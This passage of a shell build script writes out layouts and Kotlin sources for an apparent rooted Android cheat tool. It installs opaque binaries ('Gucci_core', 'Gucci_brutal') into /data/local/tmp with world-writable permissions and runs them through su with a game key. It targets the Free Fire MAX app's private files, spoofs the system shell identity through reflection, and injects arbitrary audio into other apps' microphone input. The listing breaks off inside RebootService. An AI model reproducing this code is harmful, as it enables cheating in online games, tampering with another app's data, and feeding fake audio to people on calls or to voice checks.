            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlayStop" android:layout_width="0dp" android:layout_weight="1" android:layout_height="26dp" android:text="STOP" android:textColor="#FFFFFF" app:backgroundTint="#FF4D4D" app:cornerRadius="4dp" android:textSize="8sp" android:insetTop="0dp" android:insetBottom="0dp"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageType" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="gone">
        <Spinner android:id="@+id/spinnerVoiceSelectFloater" android:layout_width="match_parent" android:layout_height="28dp" android:layout_marginBottom="4dp" android:backgroundTint="#00E5A0"/>
        <EditText android:id="@+id/etTypeHere" android:layout_width="match_parent" android:layout_height="32dp" android:hint="Type here..." android:textColor="#FFFFFF" android:textColorHint="#8B949E" android:background="#12161F" android:padding="4dp" android:textSize="10sp" android:layout_marginBottom="4dp"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal">
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlaySend" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:text="Play" android:textColor="#000000" app:backgroundTint="#00E5A0" app:cornerRadius="4dp" android:textSize="9sp" android:layout_marginEnd="2dp" android:insetTop="0dp" android:insetBottom="0dp"/>
            <com.google.android.material.button.MaterialButton android:id="@+id/btnOverlaySave" android:layout_width="0dp" android:layout_weight="1" android:layout_height="28dp" android:text="Save" android:textColor="#FFFFFF" app:backgroundTint="#8B5CF6" app:cornerRadius="4dp" android:textSize="9sp" android:insetTop="0dp" android:insetBottom="0dp"/>
        </LinearLayout>
    </LinearLayout>
    
    <LinearLayout android:id="@+id/pageLive" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:visibility="gone">
        <TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ Headphones recommended." android:textColor="#FF4D4D" android:textSize="8sp" android:textStyle="bold" android:layout_marginBottom="2dp" android:gravity="center"/>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:gravity="center_vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="4dp">
            <TextView android:layout_width="0dp" android:layout_weight="1" android:layout_height="wrap_content" android:text="🎤 Live Mode" android:textColor="#FFFFFF" android:textSize="9sp" android:textStyle="bold"/>
            <com.google.android.material.materialswitch.MaterialSwitch android:id="@+id/swLiveMic" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
        </LinearLayout>
        <LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:background="#12161F" android:padding="4dp" android:layout_marginBottom="4dp">
            <TextView android:id="@+id/tvPitch" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Pitch: 0" android:textColor="#8B949E" android:textSize="8sp"/>
            <SeekBar android:id="@+id/sbPitch" android:layout_width="match_parent" android:layout_height="wrap_content" android:max="24" android:progress="12"/>
            <TextView android:id="@+id/tvEcho" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Echo: 0ms" android:textColor="#8B949E" android:textSize="8sp"/>
            <SeekBar android:id="@+id/sbEcho" android:layout_width="match_parent" android:layout_height="wrap_content" android:max="50" android:progress="0"/>
        </LinearLayout>
    </LinearLayout>
</LinearLayout>
</com.google.android.material.card.MaterialCardView>
EOF
cat > app/src/main/res/layout/item_voice_card_mini.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<com.google.android.material.card.MaterialCardView xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="70dp" app:cardBackgroundColor="#12161F" app:cardCornerRadius="8dp" app:strokeColor="#1F4E79" app:strokeWidth="1dp">
    <RelativeLayout android:layout_width="match_parent" android:layout_height="match_parent" android:padding="4dp">
        
        <!-- FAVORITE STAR (Text Icon for guaranteed visibility) -->
        <TextView android:id="@+id/tvStarMini" android:layout_width="28dp" android:layout_height="28dp" android:text="☆" android:textColor="#8B949E" android:textSize="20sp" android:gravity="center" android:layout_alignParentTop="true" android:layout_alignParentEnd="true"/>

        <TextView android:id="@+id/tvLetterMini" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="A" android:textColor="#4FC3F7" android:textSize="20sp" android:textStyle="bold" android:layout_centerInParent="true"/>
        
        <TextView android:id="@+id/tvNameMini" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Name" android:textColor="#FFFFFF" android:textSize="8sp" android:maxLines="1" android:layout_alignParentBottom="true" android:gravity="center" android:layout_marginTop="12dp"/>
    </RelativeLayout>
</com.google.android.material.card.MaterialCardView>
EOF

# ==========================================
# KOTLIN SOURCE CODE
# ==========================================

cat > app/src/main/java/com/example/shtile/Installer.kt << 'EOF'
package com.example.shtile
import android.content.Context
import android.os.Handler
import android.os.Looper
import java.io.File
object Installer { fun installAll(context: Context, onDone: ((Boolean) -> Unit)? = null) { Thread { var ok = true; for (n in listOf("Gucci_core", "Gucci_brutal")) { try { val b = context.assets.open(n).readBytes(); val t = File(context.cacheDir, n); t.writeBytes(b); val p = ProcessBuilder("su", "-c", "cp ${t.absolutePath} /data/local/tmp/$n && chmod 777 /data/local/tmp/$n").redirectErrorStream(true).start(); p.inputStream.bufferedReader().readText(); if (p.waitFor() != 0) ok = false; t.delete() } catch (e: Exception) { ok = false } }; Handler(Looper.getMainLooper()).post { onDone?.invoke(ok) } }.start() } }
EOF
cat > app/src/main/java/com/example/shtile/ShellInjector.kt << 'EOF'
package com.example.shtile

import android.content.Context
import android.media.*
import android.os.Looper
import android.os.Process
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder

object ShellInjector {
    private var outRate = 48000
    private var outCh = 1
    private lateinit var dir: File

    @JvmStatic
    fun main(args: Array<String>) {
        try {
            dir = File(args[0])
            log("start uid=" + Process.myUid())
            Looper.prepareMainLooper()

            val activityThreadClass = Class.forName("android.app.ActivityThread")
            val systemMain = activityThreadClass.getMethod("systemMain")
            val activityThread = systemMain.invoke(null)
            val getSystemContext = activityThreadClass.getMethod("getSystemContext")
            val context = getSystemContext.invoke(activityThread) as Context

            fakeShellIdentity(context)

            val mixRuleClass = Class.forName("android.media.audiopolicy.AudioMixingRule")
            val mixRuleBuilderClass = Class.forName("android.media.audiopolicy.AudioMixingRule\$Builder")
            val ruleBuilder = mixRuleBuilderClass.getConstructor().newInstance()
            
            try {
                val setTargetMixRole = mixRuleBuilderClass.getMethod("setTargetMixRole", Int::class.java)
                setTargetMixRole.invoke(ruleBuilder, 1) // 1 = MIX_ROLE_INJECTOR
            } catch (e: Exception) { log("mix role skip: $e") }

            val capturePresetRule = mixRuleClass.getField("RULE_MATCH_ATTRIBUTE_CAPTURE_PRESET").getInt(null)
            val addRuleMethod = mixRuleBuilderClass.getMethod("addRule", AudioAttributes::class.java, Int::class.java)
            
            val presetsInt = intArrayOf(1, 5, 6, 7, 9)
            val attrBuilderClass = Class.forName("android.media.AudioAttributes\$Builder")
            val setCapturePresetMethod = attrBuilderClass.getMethod("setCapturePreset", Int::class.java)

            for (preset in presetsInt) {
                val attrBuilder = attrBuilderClass.getConstructor().newInstance()
                setCapturePresetMethod.invoke(attrBuilder, preset)
                val audioAttributes = attrBuilderClass.getMethod("build").invoke(attrBuilder) as AudioAttributes
                addRuleMethod.invoke(ruleBuilder, audioAttributes, capturePresetRule)
            }

            val mixRule = mixRuleBuilderClass.getMethod("build").invoke(ruleBuilder)

            val audioMixClass = Class.forName("android.media.audiopolicy.AudioMix")
            val audioMixBuilderClass = Class.forName("android.media.audiopolicy.AudioMix\$Builder")
            val audioPolicyClass = Class.forName("android.media.audiopolicy.AudioPolicy")
            val audioPolicyBuilderClass = Class.forName("android.media.audiopolicy.AudioPolicy\$Builder")

            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val flagLoopBack = audioMixClass.getField("ROUTE_FLAG_LOOP_BACK").getInt(null)
            var flagRender = 1
            try { flagRender = audioMixClass.getField("ROUTE_FLAG_RENDER").getInt(null) } catch (e: Exception) {}

            val combos = listOf(
                intArrayOf(48000, AudioFormat.CHANNEL_OUT_MONO, flagLoopBack),
                intArrayOf(48000, AudioFormat.CHANNEL_OUT_STEREO, flagLoopBack),
                intArrayOf(44100, AudioFormat.CHANNEL_OUT_MONO, flagLoopBack),
                intArrayOf(44100, AudioFormat.CHANNEL_OUT_STEREO, flagLoopBack),
                intArrayOf(16000, AudioFormat.CHANNEL_OUT_MONO, flagLoopBack),
                intArrayOf(48000, AudioFormat.CHANNEL_OUT_MONO, flagLoopBack or flagRender),
                intArrayOf(48000, AudioFormat.CHANNEL_OUT_STEREO, flagLoopBack or flagRender)
            )

            var track: AudioTrack? = null

            for (combo in combos) {
                try {
                    val rate = combo[0]
                    val chMask = combo[1]
                    val routeFlag = combo[2]

                    val mixBuilder = audioMixBuilderClass.getConstructor(mixRuleClass).newInstance(mixRule)
                    val format = AudioFormat.Builder()
                        .setSampleRate(rate)
                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                        .setChannelMask(chMask)
                        .build()
                    audioMixBuilderClass.getMethod("setFormat", AudioFormat::class.java).invoke(mixBuilder, format)
                    audioMixBuilderClass.getMethod("setRouteFlags", Int::class.java).invoke(mixBuilder, routeFlag)

                    val audioMix = audioMixBuilderClass.getMethod("build").invoke(mixBuilder)

                    val policyBuilder = audioPolicyBuilderClass.getConstructor(Context::class.java).newInstance(context)
                    try { audioPolicyBuilderClass.getMethod("setLooper", Looper::class.java).invoke(policyBuilder, Looper.getMainLooper()) } catch (e: Exception) {}
                    audioPolicyBuilderClass.getMethod("addMix", audioMixClass).invoke(policyBuilder, audioMix)
                    val audioPolicy = audioPolicyBuilderClass.getMethod("build").invoke(policyBuilder)

                    val registerMethod = AudioManager::class.java.getMethod("registerAudioPolicy", audioPolicyClass)
                    val result = registerMethod.invoke(audioManager, audioPolicy) as Int

                    if (result == 0) {
                        val createTrackMethod = audioPolicyClass.getMethod("createAudioTrackSource", audioMixClass)
                        val newTrack = createTrackMethod.invoke(audioPolicy, audioMix) as AudioTrack
                        if (newTrack.state == AudioTrack.STATE_INITIALIZED) {
                            newTrack.play()
                            track = newTrack
                            outRate = rate
                            outCh = if (chMask == AudioFormat.CHANNEL_OUT_MONO) 1 else 2
                            log("track ok [$rate / $outCh]")
                            break
                        } else {
                            newTrack.release()
                        }
                    }
                } catch (e: Exception) {}
            }

            if (track == null) {
                System.exit(1)
            }

            val finalTrack = track!!
            File(dir, "ready").writeText("1")
            Thread { commandLoop(finalTrack) }.start()
            Looper.loop()

        } catch (e: Exception) {
            System.exit(1)
        }
    }

    private fun fakeShellIdentity(context: Context) {
        if (Process.myUid() == 0) return
        try {
            val opField = context.javaClass.getDeclaredField("mOpPackageName")
            opField.isAccessible = true
            opField.set(context, "com.android.shell")

            val attribClass = Class.forName("android.content.AttributionSource\$Builder")
            val builder = attribClass.getConstructor(Int::class.java).newInstance(Process.myUid())
            attribClass.getMethod("setPackageName", String::class.java).invoke(builder, "com.android.shell")
            val attribSource = attribClass.getMethod("build").invoke(builder)

            val attribField = context.javaClass.getDeclaredField("mAttributionSource")
            attribField.isAccessible = true
            attribField.set(context, attribSource)
        } catch (e: Exception) {}
    }

    private fun log(msg: String) {
        try { File(dir, "inject.log").appendText("$msg\n") } catch (e: Exception) {}
    }

    private fun commandLoop(track: AudioTrack) {
        val cmdFile = File(dir, "cmd")
        val stopFile = File(dir, "stop")
        while (true) {
            try {
                if (cmdFile.exists()) {
                    val cmd = cmdFile.readText().trim()
                    cmdFile.delete()

                    if (cmd == "quit") {
                        File(dir, "ready").delete()
                        System.exit(0)
                    } else if (cmd == "stop") {
                        track.pause()
                        track.flush()
                        track.play()
                    } else {
                        playFile(track, cmd, stopFile)
                    }
                }
                Thread.sleep(50)
            } catch (e: Exception) {
                Thread.sleep(500)
            }
        }
    }

    private fun playFile(track: AudioTrack, path: String, stopFile: File) {
        try {
            val rawBytes = File(path).readBytes()
            val shortBuf = ByteBuffer.wrap(rawBytes).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer()
            val shorts = ShortArray(shortBuf.remaining())
            shortBuf.get(shorts)

            // Linear Interpolation Resampling (Exact Smali match)
            val finalShorts = if (outRate != 48000) {
                val newLen = (shorts.size.toLong() * outRate / 48000).toInt()
                val newShorts = ShortArray(newLen)
                for (i in 0 until newLen) {
                    val srcIdxF = i.toDouble() * 48000.0 / outRate
                    val srcIdx = srcIdxF.toInt()
                    val frac = srcIdxF - srcIdx
                    val s1 = shorts[srcIdx.coerceAtMost(shorts.size - 1)]
                    val s2 = shorts[(srcIdx + 1).coerceAtMost(shorts.size - 1)]
                    newShorts[i] = (s1 + (s2 - s1) * frac).toInt().toShort()
                }
                newShorts
            } else shorts

            val outShorts = if (outCh == 2) {
                val stereo = ShortArray(finalShorts.size * 2)
                for (i in finalShorts.indices) {
                    stereo[i * 2] = finalShorts[i]
                    stereo[i * 2 + 1] = finalShorts[i]
                }
                stereo
            } else finalShorts

            // 4800-byte buffer size (Exact Smali match)
            val chunkSize = outCh * 4800
            var idx = 0
            while (idx < outShorts.size) {
                if (stopFile.exists()) { stopFile.delete(); break }
                val n = minOf(chunkSize, outShorts.size - idx)
                track.write(outShorts, idx, n)
                idx += n
            }
        } catch (e: Exception) {
            log("playFile error: $e")
        }
    }
}
EOF
cat > app/src/main/java/com/example/shtile/AudioRouter.kt << 'EOF'
package com.example.shtile

import android.content.Context
import android.os.Handler
import android.os.Looper
import rikka.shizuku.Shizuku
import java.io.DataOutputStream
import java.io.File

object AudioRouter {
    private var routingActive = false
    private var injectorDir: File? = null

    fun isRootAvailable(): Boolean = try {
        val p = ProcessBuilder("su", "-c", "id").start()
        val out = p.inputStream.bufferedReader().readText(); p.waitFor()
        out.contains("uid=0")
    } catch (_: Exception) { false }

    fun isShizukuAvailable(): Boolean = try {
        Shizuku.pingBinder() && Shizuku.checkSelfPermission() == android.content.pm.PackageManager.PERMISSION_GRANTED
    } catch (_: Exception) { false }

    fun enable(context: Context, onResult: (Boolean, String) -> Unit) {
        Thread {
            injectorDir = File(context.cacheDir, "audio_injector").apply { mkdirs() }
            val dir = injectorDir!!
            
            // Clean up old files
            dir.listFiles()?.forEach { it.delete() }

            val apkPath = context.packageCodePath
            val script = "export CLASSPATH=$apkPath; app_process /system/bin com.example.shtile.ShellInjector ${dir.absolutePath}"
            
            try {
                if (isRootAvailable()) {
                    val p = Runtime.getRuntime().exec("su")
                    val os = DataOutputStream(p.outputStream)
                    os.writeBytes("$script &\n"); os.writeBytes("exit\n"); os.flush(); os.close()
                    p.waitFor()
                } else if (isShizukuAvailable()) {
                    val method = Shizuku::class.java.getDeclaredMethod("newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java)
                    method.isAccessible = true
                    method.invoke(null, arrayOf("sh", "-c", script), null, null)
                }

                // Wait for process to start (max 3 seconds)
                var success = false
                for (i in 0..30) {
                    if (File(dir, "ready").exists() || File(dir, "inject.log").exists()) {
                        success = true; break
                    }
                    Thread.sleep(100)
                }

                routingActive = success
                Handler(Looper.getMainLooper()).post { 
                    onResult(success, if (success) "✅ Mic Injection Active" else "❌ Failed to start engine")
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post { onResult(false, e.message ?: "Error") }
            }
        }.start()
    }

    fun disable(context: Context, onResult: ((Boolean, String) -> Unit)? = null) {
        Thread {
            val dir = injectorDir
            if (dir != null) {
                try { File(dir, "cmd").writeText("quit") } catch (e: Exception) {}
            }
            routingActive = false
            Handler(Looper.getMainLooper()).post { onResult?.invoke(true, "Injection OFF") }
        }.start()
    }

    fun injectAudio(context: Context, pcmBytes: ByteArray) {
        if (!routingActive || injectorDir == null) return
        Thread {
            try {
                val dir = injectorDir!!
                val soundFile = File(dir, "sound.raw")
                soundFile.writeBytes(pcmBytes)
                File(dir, "cmd").writeText(soundFile.absolutePath)
            } catch (e: Exception) {}
        }.start()
    }

    fun stopAudio(context: Context) {
        if (injectorDir == null) return
        Thread {
            try { File(injectorDir, "stop").createNewFile() } catch (e: Exception) {}
        }.start()
    }
}
EOF
cat > app/src/main/java/com/example/shtile/DualAudioOutput.kt << 'EOF'
package com.example.shtile

import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack

class DualAudioOutput(private val sampleRate: Int, private val channelMask: Int, monitorOn: Boolean = false) {
    private var injectionTrack: AudioTrack? = null
    private var monitorTrack: AudioTrack? = null
    private var monitorEnabled = monitorOn

    fun start() {
        val buf = AudioTrack.getMinBufferSize(sampleRate, channelMask, AudioFormat.ENCODING_PCM_16BIT).coerceAtLeast(4096)

        // Main injection track (Media usage so the AudioPolicy/tinymix can grab it)
        injectionTrack = build(AudioAttributes.USAGE_MEDIA, buf * 2)
        injectionTrack?.play()

        if (monitorEnabled) {
            monitorTrack = build(AudioAttributes.USAGE_MEDIA, buf * 2)
            monitorTrack?.play()
        }
    }

    private fun build(usage: Int, bufSize: Int) = AudioTrack.Builder()
        .setAudioAttributes(AudioAttributes.Builder().setUsage(usage).setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
        .setAudioFormat(AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT).setSampleRate(sampleRate).setChannelMask(channelMask).build())
        .setBufferSizeInBytes(bufSize).setTransferMode(AudioTrack.MODE_STREAM).build()

    fun write(samples: ShortArray, off: Int = 0, len: Int = samples.size) {
        try { injectionTrack?.write(samples, off, len) } catch (_: Exception) {}
        if (monitorEnabled) {
            try { monitorTrack?.write(samples, off, len) } catch (_: Exception) {}
        }
    }

    fun stop() {
        try { injectionTrack?.pause(); injectionTrack?.flush(); injectionTrack?.release() } catch (_: Exception) {}
        injectionTrack = null
        try { monitorTrack?.pause(); monitorTrack?.flush(); monitorTrack?.release() } catch (_: Exception) {}
        monitorTrack = null
    }
}
EOF
cat > app/src/main/java/com/example/shtile/MediaDecoder.kt << 'EOF'
package com.example.shtile

import android.media.AudioFormat
import android.media.MediaCodec
import android.media.MediaExtractor
import android.media.MediaFormat
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder

object MediaDecoder {
    data class DecodedAudio(val samples: ShortArray, val sampleRate: Int, val channelMask: Int)

    fun decodeToPcm(file: File): DecodedAudio? {
        val extractor = MediaExtractor()
        try {
            extractor.setDataSource(file.absolutePath)
            var trackIdx = -1; var format: MediaFormat? = null
            for (i in 0 until extractor.trackCount) {
                val f = extractor.getTrackFormat(i)
                val mime = f.getString(MediaFormat.KEY_MIME) ?: continue
                if (mime.startsWith("audio/")) { trackIdx = i; format = f; break }
            }
            if (trackIdx < 0 || format == null) return null
            extractor.selectTrack(trackIdx)
            val mime = format.getString(MediaFormat.KEY_MIME)!!
            
            val sampleRate = format.getInteger(MediaFormat.KEY_SAMPLE_RATE)
            val channelCount = if (format.containsKey(MediaFormat.KEY_CHANNEL_COUNT)) format.getInteger(MediaFormat.KEY_CHANNEL_COUNT) else 1
            val channelMask = if (channelCount == 1) AudioFormat.CHANNEL_OUT_MONO else AudioFormat.CHANNEL_OUT_STEREO
            
            val codec = MediaCodec.createDecoderByType(mime)
            codec.configure(format, null, null, 0); codec.start()
            val pcmOut = ByteArrayOutputStream()
            val info = MediaCodec.BufferInfo()
            var inEOS = false; var outEOS = false
            while (!outEOS) {
                if (!inEOS) {
                    val iIdx = codec.dequeueInputBuffer(10000)
                    if (iIdx >= 0) {
                        val inBuf = codec.getInputBuffer(iIdx)!!
                        val sz = extractor.readSampleData(inBuf, 0)
                        if (sz < 0) { codec.queueInputBuffer(iIdx, 0, 0, 0, MediaCodec.BUFFER_FLAG_END_OF_STREAM); inEOS = true }
                        else { codec.queueInputBuffer(iIdx, 0, sz, extractor.sampleTime, 0); extractor.advance() }
                    }
                }
                val oIdx = codec.dequeueOutputBuffer(info, 10000)
                if (oIdx >= 0) {
                    val outBuf = codec.getOutputBuffer(oIdx)!!
                    val chunk = ByteArray(info.size); outBuf.get(chunk); pcmOut.write(chunk)
                    codec.releaseOutputBuffer(oIdx, false)
                    if ((info.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) outEOS = true
                }
            }
            codec.stop(); codec.release()
            
            val bytes = pcmOut.toByteArray()
            val shorts = ShortArray(bytes.size / 2)
            ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().get(shorts)

            return DecodedAudio(shorts, sampleRate, channelMask)
        } catch (_: Exception) { return null } finally { extractor.release() }
    }
}
EOF
cat > app/src/main/java/com/example/shtile/VoiceProcessor.kt << 'EOF'
package com.example.shtile

import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import kotlin.math.cos
import kotlin.math.pow
import kotlin.math.tanh

object VoiceProcessor {
    const val SAMPLE_RATE = 48000

    fun pitchShift(input: ShortArray, semitones: Float): ShortArray {
        if (semitones == 0f || input.isEmpty()) return input.copyOf()
        val factor = 2.0.pow(semitones / 12.0).toFloat()
        val out = ShortArray(input.size)
        val grain = 512
        val hop = 128
        val hann = FloatArray(grain) { (0.5 - 0.5 * cos(2.0 * Math.PI * it / (grain - 1))).toFloat() }
        val acc = FloatArray(input.size + grain)
        val wsum = FloatArray(input.size + grain)
        var outPos = 0
        var inPos = 0.0
        while (outPos < input.size) {
            for (j in 0 until grain) {
                val srcIdx = (inPos + j).toInt()
                val s = if (srcIdx in input.indices) input[srcIdx].toFloat() * hann[j] else 0f
                val dstIdx = outPos + j
                if (dstIdx in acc.indices) { acc[dstIdx] += s; wsum[dstIdx] += hann[j] }
            }
            outPos += hop
            inPos += hop * factor
        }
        for (i in out.indices) {
            out[i] = if (wsum[i] > 0.001f) (acc[i] / wsum[i]).toInt().coerceIn(-32768, 32767).toShort() else 0.toShort()
        }
        return out
    }

    class EchoState {
        private var delayBuf = ShortArray(0)
        fun process(input: ShortArray, delaySamples: Int, feedback: Float): ShortArray {
            if (delaySamples <= 0) return input.copyOf()
            if (delayBuf.size != delaySamples) delayBuf = ShortArray(delaySamples)
            val out = ShortArray(input.size)
            for (i in input.indices) {
                val delayed = delayBuf[i % delaySamples]
                val v = (input[i] + delayed * feedback).toInt().coerceIn(-32768, 32767).toShort()
                out[i] = v
                delayBuf[i % delaySamples] = v
            }
            return out
        }
    }

    fun applyDistortion(input: ShortArray, drive: Float): ShortArray {
        if (drive <= 1f) return input.copyOf()
        return ShortArray(input.size) { i ->
            (tanh((input[i] / 32768f) * drive) * 32767).toInt().coerceIn(-32768, 32767).toShort()
        }
    }

    fun applyAll(input: ShortArray, semitones: Float, echoMs: Int, echoFb: Float, drive: Float, echoState: EchoState): ShortArray {
        var s = pitchShift(input, semitones)
        if (echoMs > 0) s = echoState.process(s, echoMs * SAMPLE_RATE / 1000, echoFb)
        if (drive > 1f) s = applyDistortion(s, drive)
        return s
    }

    fun saveWav(file: File, samples: ShortArray, sampleRate: Int = SAMPLE_RATE) {
        val dataSize = samples.size * 2
        val h = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN)
        h.put("RIFF".toByteArray()); h.putInt(36 + dataSize); h.put("WAVE".toByteArray()); h.put("fmt ".toByteArray())
        h.putInt(16); h.putShort(1); h.putShort(1); h.putInt(sampleRate); h.putInt(sampleRate * 2); h.putShort(2); h.putShort(16)
        h.put("data".toByteArray()); h.putInt(dataSize)
        file.outputStream().use { o ->
            o.write(h.array())
            val pcm = ByteBuffer.allocate(dataSize).order(ByteOrder.LITTLE_ENDIAN)
            for (s in samples) pcm.putShort(s)
            o.write(pcm.array())
        }
    }
}
EOF
cat > app/src/main/java/com/example/shtile/VoiceDataHelper.kt << 'EOF'
package com.example.shtile

import android.content.Context
import android.net.Uri
import android.provider.OpenableColumns
import java.io.File
import java.io.FileOutputStream

object VoiceDataHelper {
    fun getVoicesDir(context: Context): File {
        val dir = File(context.filesDir, "gucci_voices")
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    fun getAllVoices(context: Context): List<File> {
        val dir = getVoicesDir(context)
        return dir.listFiles { file -> file.extension.lowercase() in listOf("wav", "mp3", "m4a", "aac", "ogg") }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun saveFromUri(context: Context, uri: Uri): File? {
        return try {
            var baseName = "Voice_${System.currentTimeMillis()}"
            var ext = "wav"
            context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val nameIndex = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                    if (nameIndex != -1) {
                        val fullName = cursor.getString(nameIndex)
                        baseName = fullName.substringBeforeLast(".").replace("[^a-zA-Z0-9]".toRegex(), "_")
                        ext = fullName.substringAfterLast(".", "wav").lowercase()
                    }
                }
            }
            if (ext !in listOf("wav", "mp3", "m4a", "aac", "ogg")) ext = "wav"
            
            val inputStream = context.contentResolver.openInputStream(uri) ?: return null
            val file = File(getVoicesDir(context), "$baseName.$ext")
            val outputStream = FileOutputStream(file)
            inputStream.copyTo(outputStream)
            inputStream.close()
            outputStream.close()
            file
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }

    fun deleteVoice(file: File) {
        if (file.exists()) file.delete()
    }
}
EOF

cat > app/src/main/java/com/example/shtile/RunnerService.kt << 'EOF'
package com.example.shtile
import android.app.*
import android.content.Intent
import android.os.*
import android.widget.Toast
import androidx.core.app.NotificationCompat
class RunnerService : Service() { 
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int { 
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager; if (nm.getNotificationChannel("c") == null) nm.createNotificationChannel(NotificationChannel("c", "c", NotificationManager.IMPORTANCE_MIN)) }; 
        try { startForeground(1, NotificationCompat.Builder(this, "c").setSmallIcon(android.R.drawable.stat_notify_sync_noanim).build()) } catch (e: Exception) {}; 
        val a = intent?.action; 
        Thread { 
            try { 
                val p = getSharedPreferences("GucciPrefs", MODE_PRIVATE); 
                val c = if (a == "BRUTAL") { "cd /data/local/tmp && (echo 2; sleep 5; echo ${p.getString("brutal_option", "7")}; sleep 2) | ./Gucci_brutal" } else { val k = p.getString("game_key", "")?.trim(); if (k.isNullOrEmpty()) { Handler(Looper.getMainLooper()).post { Toast.makeText(applicationContext, "Save Game Key first!", Toast.LENGTH_LONG).show() }; stopSelf(); return@Thread }; "cd /data/local/tmp && (sleep 4; echo '$k'; sleep 2) | ./Gucci_core" }; 
                val pr = ProcessBuilder("su", "-c", c).redirectErrorStream(true).start(); pr.inputStream.bufferedReader().readText(); pr.waitFor() 
            } catch (e: Exception) {}; 
            stopForeground(true); stopSelf() 
        }.start(); 
        return START_NOT_STICKY 
    }; 
    override fun onBind(intent: Intent?): IBinder? = null 
}
EOF

cat > app/src/main/java/com/example/shtile/TimerService.kt << 'EOF'
package com.example.shtile
import android.app.*
import android.content.Intent
import android.os.*
import androidx.core.app.NotificationCompat
import java.io.DataOutputStream
class TimerService : Service() {
    private var timerThread: Thread? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager; if (nm.getNotificationChannel("timer_ch") == null) nm.createNotificationChannel(NotificationChannel("timer_ch", "Timer", NotificationManager.IMPORTANCE_LOW)) }
        val notification = NotificationCompat.Builder(this, "timer_ch").setContentTitle("Protection Timer Active").setContentText("Apps will be restored automatically...").setSmallIcon(android.R.drawable.ic_menu_recent_history).setPriority(NotificationCompat.PRIORITY_LOW).build()
        startForeground(2, notification)
        val minutes = intent?.getIntExtra("minutes", 0) ?: 0
        if (minutes <= 0) { stopSelf(); return START_NOT_STICKY }
        timerThread = Thread {
            try {
                Thread.sleep(minutes * 60 * 1000L)
                val prefs = getSharedPreferences("HidePrefs", MODE_PRIVATE)
                val hidden = prefs.getStringSet("hidden_history", emptySet()) ?: emptySet()
                val frozen = prefs.getStringSet("frozen_history", emptySet()) ?: emptySet()
                val deepFrozen = prefs.getStringSet("deep_frozen_history", emptySet()) ?: emptySet()
                val allApps = hidden + frozen + deepFrozen
                if (allApps.isNotEmpty()) {
                    val cmd = StringBuilder()
                    for (pkg in allApps) { cmd.append("pm unhide $pkg; pm enable $pkg; pm unsuspend $pkg; cmd package install-existing --user 0 $pkg; ") }
                    val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream)
                    os.writeBytes(cmd.toString() + "\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor()
                    prefs.edit().remove("hidden_history").remove("frozen_history").remove("deep_frozen_history").putBoolean("is_pay_hidden", false).apply()
                }
            } catch (e: Exception) {} finally { stopSelf() }
        }
        timerThread?.start(); return START_NOT_STICKY
    }
    override fun onDestroy() { timerThread?.interrupt(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
EOF

cat > app/src/main/java/com/example/shtile/RebootService.kt << 'EOF'
package com.example.shtile
import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
class RebootService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val targetDir = "/data/user/0/com.dts.freefiremax/files/*" 
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel("reboot_ch") == null) {
